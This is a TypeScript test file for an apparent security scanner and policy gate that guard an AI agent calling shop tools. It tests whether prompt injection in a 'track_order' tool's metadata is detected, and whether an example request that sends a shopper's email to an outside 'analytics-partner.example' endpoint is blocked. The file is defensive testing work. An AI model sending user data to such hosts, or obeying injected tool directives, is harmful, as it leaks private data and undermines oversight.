import test, { describe, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { buildManifest } from "../src/lib/analyzer";
import { DEMO_REPO_FILES, DEMO_REPO_LABEL, DEMO_REPO_URL } from "../src/lib/fixtures/demoRepo";
import { scanManifest, mergeRuntimeFindings } from "../src/lib/security/scan";
import { PolicyGate } from "../src/lib/security/monitor";
import { makeExecutor } from "../src/lib/executor";
import { runAgent } from "../src/lib/agent/runner";

describe("Security Policy & Agent Execution Tests", () => {
  const origin = "http://localhost:3000";
  const manifest = buildManifest(DEMO_REPO_FILES, DEMO_REPO_URL, DEMO_REPO_LABEL);
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    // Mock local fetch for unit tests
    globalThis.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
      const urlStr = input.toString();
      const method = init?.method ?? "GET";

      if (urlStr.includes("/api/products/p-101")) {
        return new Response(
          JSON.stringify({ id: "p-101", name: "Meridian Runner", price: 2499 }),
          { status: 200, headers: { "content-type": "application/json" } },
        );
      }
      if (urlStr.includes("/api/products")) {
        return new Response(
          JSON.stringify({
            count: 1,
            products: [{ id: "p-101", name: "Meridian Runner", price: 2499 }],
          }),
          { status: 200, headers: { "content-type": "application/json" } },
        );
      }
      if (urlStr.includes("/api/cart")) {
        return new Response(
          JSON.stringify({ lines: [{ productId: "p-101", quantity: 1 }], total: 2499 }),
          { status: 200, headers: { "content-type": "application/json" } },
        );
      }
      if (urlStr.includes("/api/orders/track")) {
        return new Response(
          JSON.stringify({ orderId: "ord-demo", status: "confirmed" }),
          { status: 200, headers: { "content-type": "application/json" } },
        );
      }
      if (urlStr.includes("/api/checkout")) {
        return new Response(
          JSON.stringify({ orderId: "ord-demo", charged: true, status: "confirmed", total: 2499 }),
          { status: 200, headers: { "content-type": "application/json" } },
        );
      }
      return new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    };
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  test("Static scan: detects prompt injection and egress in track_order, and read-only mismatch in checkout", () => {
    const verdicts = scanManifest(manifest, origin);
    assert.equal(verdicts.length, 5);

    // track_order should be BLOCKED due to high severity injection and data egress
    const trackVerdict = verdicts.find((v) => v.tool === "track_order");
    assert.ok(trackVerdict);
    assert.equal(trackVerdict?.verdict, "blocked");
    assert.ok(trackVerdict?.findings.some((f) => f.check === "metadata-injection"));
    assert.ok(trackVerdict?.findings.some((f) => f.check === "sensitive-data-egress"));

    // checkout should have medium severity read-only mismatch warning (POST vs readOnlyHint: true)
    const checkoutVerdict = verdicts.find((v) => v.tool === "checkout");
    assert.ok(checkoutVerdict);
    assert.equal(checkoutVerdict?.verdict, "verified"); // only medium in static phase
    assert.ok(checkoutVerdict?.findings.some((f) => f.check === "readonly-mismatch" && f.severity === "medium"));

    // search_products, get_product, add_to_cart should be verified
    const searchVerdict = verdicts.find((v) => v.tool === "search_products");
    assert.equal(searchVerdict?.verdict, "verified");
    assert.equal(searchVerdict?.findings.length, 0);
  });

  test("PolicyGate: intercepts and blocks unauthorized cross-origin network requests", async () => {
    const gate = new PolicyGate(origin, true);
    const trackTool = manifest.tools.find((t) => t.name === "track_order")!;

    // Send egress attempt to external destination
    const result = await gate.send(
      trackTool,
      "POST",
      "https://analytics-partner.example/collect",
      { email: "shopper@example.com", orderId: "ord-demo" },
    );

    assert.equal(result.allowed, false);
    assert.equal(gate.observed.length, 1);
    assert.equal(gate.observed[0].crossOrigin, true);
    assert.equal(gate.findings.length, 1);
    assert.equal(gate.findings[0].severity, "high");
    assert.equal(gate.findings[0].check, "sensitive-data-egress");
  });

  test("Guarded agent: refuses blocked tools and does not follow malicious directives", async () => {
    const verdicts = scanManifest(manifest, origin);
    const gate = new PolicyGate(origin, true);

    const steps = await runAgent({
      manifest,
      verdicts,
      gate,
      mode: "guarded",
      onStep: () => {},
    });

    assert.ok(steps.length > 0);

    // Guarded agent refuses track_order because it was blocked by scan
    const trackStep = steps.find((s) => s.tool === "track_order");
    assert.ok(trackStep);
    assert.equal(trackStep?.status, "blocked");
    assert.ok(trackStep?.summary.includes("Refused"));

    // Guarded agent holds checkout for human confirmation
    const checkoutStep = steps.find((s) => s.tool === "checkout");
    assert.ok(checkoutStep);
    assert.equal(checkoutStep?.status, "blocked");
    assert.ok(checkoutStep?.summary.includes("Held checkout"));

    // No cross-origin network calls should have been made
    assert.equal(gate.observed.filter((r) => r.crossOrigin).length, 0);
  });

  test("Unguarded agent & Runtime finding merge: confirms runtime mutation and exfiltration block", async () => {
    const verdicts = scanManifest(manifest, origin);
    const gate = new PolicyGate(origin, true);

    const steps = await runAgent({
      manifest,
      verdicts,
      gate,
      mode: "unguarded",
      onStep: () => {},
    });

    assert.ok(steps.length > 0);

    // Unguarded agent attempts exfiltration and gets intercepted by policy gate
    const exfilStep = steps.find((s) => s.tool === "track_order" && s.status === "blocked");
    assert.ok(exfilStep);
    assert.ok(exfilStep?.summary.includes("Blocked exfiltration"));

    // Merge runtime findings back into verdicts
    const updatedVerdicts = mergeRuntimeFindings(verdicts, gate.findings);
    const checkoutVerdict = updatedVerdicts.find((v) => v.tool === "checkout");
    assert.ok(checkoutVerdict);
    // After execution confirmed charged: true mutation, checkout has high severity finding
    assert.equal(checkoutVerdict?.verdict, "blocked");
  });
});

